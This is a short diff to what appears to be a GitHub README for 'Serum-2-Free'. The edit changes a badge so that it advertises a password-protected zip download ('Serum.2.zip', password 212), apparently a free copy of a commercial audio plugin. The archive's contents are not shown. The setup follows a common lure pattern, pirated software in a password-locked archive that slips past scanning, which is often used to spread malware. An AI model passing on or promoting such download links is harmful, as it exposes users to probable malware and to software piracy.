@@ -11,7 +11,7 @@
     <img src="https://img.shields.io/badge/LAST%20UPDATE-07.09.2026-FEE75C?style=for-the-badge&logo=calendar&logoColor=black">
   </a>
   <a href="https://github.com/sam-v-hq99v4/Serum-2-Free/releases/download/v2.1.2/Serum.2.zip">
-    <img src="https://img.shields.io/badge/PASSW0RD-212-ED4245?style=for-the-badge&logo=keycdn&logoColor=white">
+    <img src="https://img.shields.io/badge/DOWNLOAD | PASSW0RD-212-ED4245?style=for-the-badge&logo=keycdn&logoColor=white">
   </a>
 </p>
 
